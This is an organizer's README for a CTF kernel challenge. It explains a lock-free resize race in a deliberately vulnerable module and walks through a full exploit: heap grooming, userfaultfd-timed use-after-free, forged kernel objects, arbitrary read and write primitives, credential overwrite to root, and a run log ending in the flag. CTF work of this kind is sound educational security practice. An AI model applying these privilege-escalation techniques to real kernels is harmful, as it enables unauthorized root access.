# Kernel exploitation challenge for r2ctf

## Package contents

This package contains the following things:

* The kernel module source is in `module/`.

* The files to provide to the participants can be found in `challenge_v2_pub/`

* The files to run in the production server can be found in `challenge_v2_prod/`. WARNING: These files contain the actual flag and should NOT be available to participants in any way except than through a TCP/IP connection to the challenge console.

* An example exploit is provided in `exploit/`.

## Challenge description

You can put something like this:

```
We fixed last year's bug in r2 kernel socks, and while at it made a few small 
changes and added a very wanted feature.

Can you still root the server?
```

Or whatever you can think of :)

I was also thinking it may be worth it to provide the link to the new version.


## Challenge setup

The challenge is provided as a VM image that boots into a limited shell.

The objective of the challenge is to root the image by exploiting a bug in the `/dev/r2socks2` kernel module (or a Linux kernel bug for that matter).

Once rooted, the flag can be read off `/flag.txt`

## The bug

The new code allows resizing the buffer, but does not take any locks while doing so:

```c
static long socks_ioctl_resize(sock_t *sock, unsigned long arg) {
    void *new_buffer = NULL;
    uint64_t new_size = arg;
    uint64_t copy_size = 0;
    uint64_t old_size = 0;
    void *old_buffer = NULL;
    mm_segment_t old_fs;

    if (sock->state < INITIALIZED) {
        /* Bad state */
        return -1;
    }

    /* Can't grow over the max! */
    if (new_size > MAX_SIZE) {
        return -1;
    }

    if (sock->buf == NULL) {
        /* Shouldn't happen if we're initialized, but just in case */
        return -1;
    }

    /* Nothing to do if same size */
    if (sock->buf->size == new_size)
        return 0;

    /* If it's becoming smaller, ensure it fits! */
    if (new_size < sock->buf->size) {

        if (sock_buf_count(sock->buf) >= new_size) {
            // printk(KERN_ALERT "shrinking but it won't fit!\n");

            return -1;
        }
    }


    int err = 0;
    /* Make a new buffer */

    new_buffer = kzalloc(new_size, GFP_KERNEL);

    if (IS_ERR_OR_NULL(new_buffer)) {
        err = (new_buffer ? PTR_ERR(new_buffer) : -ENOMEM);
        return -1;
    }

    /* Get the old buffer */
    old_buffer = sock->buf->buffer;
    old_size = sock->buf->size;

    /*
     * Pull data to front of new buffer. Since we are going to use
     * socks_pull, we need to use KERNEL_DS.
     */
    old_fs = get_fs();
    set_fs(KERNEL_DS);
    copy_size = sock_buf_count(sock->buf);
    socks_pull(sock->buf, new_buffer, copy_size);
    
    /* Replace old buffer by new buffer */
    sock->buf->write_index = copy_size;
    sock->buf->read_index = 0;
    sock->buf->size = new_size;
    sock->buf->buffer = new_buffer;
    set_fs(old_fs);


    
    /*
     * And now free the old buffer.
     * Let's fill it with 0xcc first for debugging purposes.
     */
    memset(old_buffer, 0xcc, old_size);
    kfree(old_buffer);

    return 0;
}

```

You can also see that the old buffer always gets freed and filled with 0xcc values 
by the end of the resize.

Since there are no locks, we can for example race with a read operation in 
order to free the buffer before it's copied to userspace. Then we have a UAF 
read. Similarly, we can race with a write operation to cause a UAF write.

This is made easier by enabling unprivileged userfaultfd, which allows to stop 
the kernel at the right moment.

## Exploit

The exploit first creates a number of sockets of size 0x20 to exhaust the slab cache and make sure they are contiguous.

Then it makes a few more sockets and connects them:

```c

    for(int i=0; i < 0x400 - 0x10; i++) {
        // Open a bunch of size 0 (alloc size 0x20 for all of them)
        int fd = open("/dev/r2socks2", O_RDONLY);
        sock_init(fd, 0x20);
    }
    /* Let's have two socks */

    printf("[*] Creating server0\n");
    server[0] = open("/dev/r2socks2", O_RDONLY);
    sock_init(server[0], 0x80);
    sock_listen(server[0], "socket0");  

    printf("[*] Creating server1\n");
    server[1] = open("/dev/r2socks2", O_RDONLY);
    sock_init(server[1], 0x80);
    sock_listen(server[1], "socket1");

    printf("[*] Creating server2\n");
    server[2] = open("/dev/r2socks2", O_RDONLY);
    sock_init(server[2], 0x80);
    sock_listen(server[2], "socket2");  

    printf("[*] Creating client0\n");
    client[0] = open("/dev/r2socks2", O_RDONLY);
    sock_init(client[0], 0x80);
    sock_connect(client[0], "socket0");
```

The exploit sets up a userfaultfd mapping with 2 pages, and uses this to 
trigger two UAF (read and write) as explained before.

For the read, we first send data to the socket and then read back using the 
uffd mapping:

```c
    /* Prefill buffer with some data so we can read back */
    sock_send(server[0], buf1, 0x70);
    /*
     *  Do an unaligned read so we leak as much as possible
     * client[0] buffer gets freed and replaced by a sock_buf_t (for uaf[0])
     */

    int x = sock_recv(client[0], map + 1, 0x70);
```

This triggers the `uffd` thread, which uses the resize operation to free the 
buffer and replace it by a new socket object:

```c
            if (count == 0) {
                /* 
                 * First time we just want to leak it, but let's also 
                 * leak the address of a buffer so we can leak it too.
                 */

                /* Resize to 0x100 so we get a uaf on the buffer */
                int resize = ioctl(client[0], IOCTL_SOCKS_RESIZE, 0x100);
                printf("[*] Resize client[%d] said: %d\n", count, resize);

                /* Replace the freed buffer by a sock_t */
                uaf[count] = open("/dev/r2socks2", O_RDONLY);
                printf("[*] Created uaf[%d]\n", count);
                sock_init(uaf[count], 0x80);

                /* 
                 * And put it to listen so we also leak the address of 
                 * the module itself and one of the servers.
                 */

                sock_listen(uaf[count], "uaf0");
            
            } 
```

After this, the read will contain the contents of the `sock_t`:

```c
typedef struct sock {
    spinlock_t lock;
    struct list_head listening_list;
    int state;
    sock_t *peer;
    sock_buf_t *buf;
    unsigned char name[64];
} sock_t;
```

This includes not only the buffer, but also the `list_head` points to the 
global area of the module itself. The list_head also points to the other 
listening socket (s2):

```c
    uint64_t uaf0_listen_next = *(uint64_t *)(map + 1 + 8);
    uint64_t uaf0_listen_prev = *(uint64_t *)(map + 1 + 16);
    /* This must be s2 */
    printf("[*] uaf[0]->listening.next : %lx\n", uaf0_listen_next);
    /* This must be in the module address space */
    
    printf("[*] uaf[0]->listening.prev : %lx\n", uaf0_listen_prev);

    uint64_t s2_sock = uaf0_listen_next - 8;
    uint64_t s2_buf_data = s2_sock + 0x80;
    uint64_t module_list = uaf0_listen_prev;
    uint64_t module = module_list - 0x23c8L;
    uint64_t sock_fop = module + 0x1200L;
    uint64_t uaf0_sock = s2_sock + 0x180;

    /* This is the sock_buf_t in the kmalloc-32 heap */
    uint64_t uaf0_buf = *(uint64_t *)(map + 1 + 0x28);
    printf("[*] uaf[0]->sock->buf : %lx\n", uaf0_buf); 
```

Having this data, we can now try to do the same trick again but for writing, 
in order to craft a fake socket object:

```c
    /*
     * At this stage we'll try to smash a sock_t and point it's buffer
     * to a controllable location.
     *
     * We choose the uaf0 buffer data because we can just write to it
     * at any time.
     */

    uint64_t uaf0_buf_data = uaf0_sock + 0x100;

    /*
     * Prepare a sock_buf_t in buf for the smash.
     */
     
    *(uint64_t *)(buf + 0x00) = 0;               // spinlock    
    *(uint64_t *)(buf + 0x08) = s2_buf_data + 8; // listening.next
    *(uint64_t *)(buf + 0x10) = s2_buf_data + 8; // listening.prev
    *(uint64_t *)(buf + 0x18) = 1;               // state = INITIALIZED
    *(uint64_t *)(buf + 0x20) = 0;               // peer = none
    *(uint64_t *)(buf + 0x28) = uaf0_buf_data;   // buf
```

Basically we will craft an initialized object, with its `buf` field pointing
to one of the other sockets data, which we control. This allows us to have 
arbitrary read/write capabilities by setting up the `buf` correctly.

Once the data is ready, we trigger the second UAF by receiving from the socket 
into the uffd map. We use the second page because the first one was already 
faulted in:

```c
    /*
     * We want uaf[1] to be on top of server[2] data
     * such that the empty list above makes sense.
     */

    sock_init(client[1], 0x80);
    sock_connect(client[1], "socket2");


    /*
     * Send through client[1] to cause uaf on server[2].
     */
    int read1 = sock_send(client[1], map + 0x1000, 0x30);
```

And this again triggers the uffd thread, which now does this:

```c
                /*
                 * Second time we want to smash the data of a connected socket
                 */

                /* Resize to 0x100 so we get a uaf on the buffer */
                int resize = ioctl(server[2], IOCTL_SOCKS_RESIZE, 0x100);
                printf("[*] Resize client[%d] said: %d\n", count, resize);

                /* Replace the freed buffer by a sock_t */
                uaf[count] = open("/dev/r2socks2", O_RDONLY);
                printf("[*] Created uaf[%d]\n", count);
```

The socket described by `uaf[1]` will have its contents overwritten, so 
we can use it for reading and writing. We just have to connect it to 
another socket first:

```c
    /* 
     * Now uaf[1] has a socket that points into uaf[0]'s in-flight data.
     * We can now make a client to connect to uaf0.
     */

    client[2] = open("/dev/r2socks2", O_RDONLY);
    sock_init(client[2], 0x80);
    int r = sock_connect(client[2], "uaf0");
    printf("[*] Connect to uaf0: %d", r);

    /* We also connect uaf[1] to server[1] so we can send/recv data through it */
    sock_connect(uaf[1], "socket1");
```

Now in order to do an arbitrary read we prepare a fake buffer and then do a 
receive through `uaf[1]`. For arbitrary write we do similarly but for a send 
instead:

```c

uint64_t read64(uint64_t addr) {

    /* Place a fake buffer into it */
    uint64_t sock_buf[4];
    sock_buf[0] = 0x10;     // size
    sock_buf[1] = addr;     // buffer
    sock_buf[2] = 0x0;      // read_index
    sock_buf[3] = 0x08;     // write_index = almost full
    int r = sock_send(client[2], sock_buf, sizeof(sock_buf));
    // printf("[*] Send to uaf[0]: %d\n", r);

    uint64_t leak;
    r = sock_recv(uaf[1], &leak, 8);

    /*
     * Now we need to reset the read/write indeces for uaf[0].
     * For that, first flush the data we have in it so far.
     */

    char buf[0x80];
    r = sock_recv(uaf[0], buf, sizeof(buf));
    // printf("[*] Flushed %d bytes off uaf[0] buffer\n" , r);

    /* Now place "write_buf" back to 0 */
    r = sock_send(client[2], buf, 0x80-r);
    // printf("[*] Pushed %d bytes to uaf[0] buffer\n" , r);

    /* Now get read_index back to zero too */
    r = sock_recv(uaf[0], buf, sizeof(buf));    
    // printf("[*] Flushed %d bytes off uaf[0] buffer\n" , r);


    return leak;
}

void write64(uint64_t addr, uint64_t value) {

    /* Place a fake buffer into it */
    uint64_t sock_buf[4];
    sock_buf[0] = 0x10;     // size
    sock_buf[1] = addr;     // buffer
    sock_buf[2] = 0x0;      // read_index
    sock_buf[3] = 0x0;  // write_index = empty
    int r = sock_send(client[2], sock_buf, sizeof(sock_buf));
    // printf("[*] Send to uaf[0]: %d\n", r);

    // Send to uaf[1] through sever[1]
    r = sock_send(server[1], &value, 8);

    /*
     * Now we need to reset the read/write indeces for uaf[0].
     * For that, first flush the data we have in it so far.
     */

    char buf[0x80];
    r = sock_recv(uaf[0], buf, sizeof(buf));
    // printf("[*] Flushed %d bytes off uaf[0] buffer\n" , r);

    /* Now place "write_buf" back to 0 */
    r = sock_send(client[2], buf, 0x80-r);
    // printf("[*] Pushed %d bytes to uaf[0] buffer\n" , r);

    /* Now get read_index back to zero too */
    r = sock_recv(uaf[0], buf, sizeof(buf));    
    // printf("[*] Flushed %d bytes off uaf[0] buffer\n" , r);

}
```

Using these two primitives we have full access to the kernel. The exploit 
now finds the kernel base from the `file_operations` in the socket, goes 
through the task list to find itself and sets its credentials to root.

## Example run

Since the Qemu image has networking enabled, we can test it by just using 
netcat to pull the exploit files from the host:

```
/ $ cd
~ $ nc 10.0.2.2 1234 > exploit ; chmod +x exploit ; ./exploit
[*] Creating server0
[*] Trying to listen in socket0
[*] Creating server1
[*] Trying to listen in socket1
[*] Creating server2
[*] Trying to listen in socket2
[*] Creating client0
[*] Trying to connect to socket0
[*] uffd: 1016
[*] uffd API ok
[*] uffd registered
[*] userfaultfd thread running, fd 1016
[*] Got userfaultfd message 18 
[*] Fault at 7ff15e834000
[*] Resize client[0] said: 0
[*] Created uaf[0]
[*] Trying to listen in uaf0
[*] uaf[0]->listening.next : ffff888002826288
[*] uaf[0]->listening.prev : ffffffffa00023c8
[*] uaf[0]->sock->buf : ffff888002821c80
[*] Trying to connect to socket2
[*] Got userfaultfd message 18 
[*] Fault at 7ff15e835000
[*] Resize client[1] said: 0
[*] Created uaf[1]
[*] sock_send: 48
[*] At map+0x1000: 0
[*] At map+0x1008: ffff888002826308
[*] At map+0x1010: ffff888002826308
[*] At map+0x1018: 1
[*] At map+0x1020: 0
[*] Trying to connect to uaf0
[*] Connect to uaf0: 0[*] Trying to connect to socket1
[*] no_llseek = 0xffffffff8119eff0
[*] Kernel base = 0xffffffff81000000
[*] We are: 0
/bin/sh: can't access tty; job control turned off
/home/user # cat /flag.txt 
r2con{k3rn3l_r4c3s_m4d3_3asy_by_uffd}
/home/user # 
```

That is the flag that should be set in the panel ;).

## Running in production

To run in production, simply launch `run.sh` through e.g. a `xinetd` service, 
exactly as last year.

See for example this:

https://github.com/OpenToAllCTF/OTA-University/tree/master/challenge_templates/pwn
